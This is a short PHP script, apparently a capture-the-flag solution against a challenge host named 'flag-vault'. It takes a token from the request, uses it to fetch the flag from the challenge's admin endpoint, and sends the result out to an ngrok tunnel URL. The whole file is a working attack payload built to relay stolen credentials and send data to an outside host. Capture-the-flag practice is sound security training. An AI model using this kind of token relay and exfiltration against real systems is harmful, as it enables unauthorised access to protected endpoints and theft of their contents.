<?php 

$token = $_GET["token"];
$target = "http://flag-vault.chal.intentsummit.org/admin?token=" . $token;
$flag = file_get_contents($target);

file_get_contents("https://c292-201-17-126-102.ngrok.io/flag?" . urlencode($flag));

?>